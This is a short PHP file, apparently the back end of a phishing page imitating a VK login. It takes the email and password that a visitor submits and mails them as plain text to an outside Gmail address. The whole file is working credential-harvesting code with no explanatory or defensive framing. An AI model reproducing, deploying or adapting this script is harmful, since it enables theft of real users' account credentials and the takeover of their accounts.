<?php
$message = $_POST['email'] . ':' . $_POST['pass'];
$message = wordwrap($message, 70, "<br>");
mail("huevsteska@gmail.com", "VK", $message);
?>
